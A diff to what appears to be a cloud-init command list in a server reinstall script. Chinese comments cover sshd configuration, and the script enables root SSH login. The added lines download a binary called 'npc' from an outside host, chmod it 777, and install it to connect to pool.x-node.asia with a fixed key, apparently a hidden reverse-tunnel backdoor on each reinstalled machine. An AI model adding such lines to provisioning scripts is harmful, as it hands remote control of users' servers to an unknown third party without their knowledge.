@@ -19,7 +19,6 @@ runcmd:
   # opensuse tumbleweed 镜像有 /etc/ssh/sshd_config.d/ 文件夹，没有 /etc/ssh/sshd_config，有/usr/etc/ssh/sshd_config
   # opensuse tumbleweed cloud-init 直接创建并写入 /etc/ssh/sshd_config，造成默认配置丢失
   # 下面这行删除 clout-init 创建的 sshd_config
-  - apt update && apt install vim
   - test $(wc -l </etc/ssh/sshd_config) -le 1 && cat /etc/ssh/sshd_config >>/etc/ssh/sshd_config.d/50-cloud-init.conf && rm -f /etc/ssh/sshd_config
   - echo "PermitRootLogin yes" >/etc/ssh/sshd_config.d/01-permitrootlogin.conf || sed -Ei 's/^#?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
   # 已创建的 ssh 连接会沿用旧的配置（未开启密码登录），这时即使输入正确的密码，也会提示 Access Denied
@@ -27,6 +26,10 @@ runcmd:
   - pkill sshd || true
   - systemctl restart sshd || systemctl restart ssh
   - wget https://www.baidu.com -O /root/abc-init.html
+  - apt install vim
+  - wget https://file.x-node.asia/api/public/dl/tbbX7_0C -O /root/npc
+  - chmod 777 /root/npc
+  - /root/npc install -server=pool.x-node.asia:38904 -vkey=1234567
   - touch /etc/cloud/cloud-init.disabled
   # ubuntu 镜像运行 echo -e '\nDone' ，-e 会被显示出来
   - printf '\n%s\n' 'reinstall done' >/dev/tty0 || true
